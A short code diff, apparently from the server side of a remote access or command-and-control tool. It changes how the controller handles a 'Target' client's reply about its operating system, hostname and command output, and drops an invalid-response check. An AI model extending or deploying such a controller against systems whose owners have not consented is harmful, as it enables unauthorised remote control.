@@ -63,15 +63,12 @@ while True:
             if client[0].recv(1024).decode() == 'nnt':
                 print('The Target isnt on Windows...')
                 continue
-            elif client[0].recv(1024).decode() == 'nt':
+            else:
                 hostname = client[0].recv(1024).decode()
                 output = client[0].recv(1024).decode()
                 print(hostname)
                 print(output)
                 sys.stderr = object
-            else:
-                print('Recieved invalid response from Target exiting...')
-                client[0].close()
 
         # To add your own command remove the # below and change alias with the command alias and command with the command name
         # Make sure to add it to Client.py as well
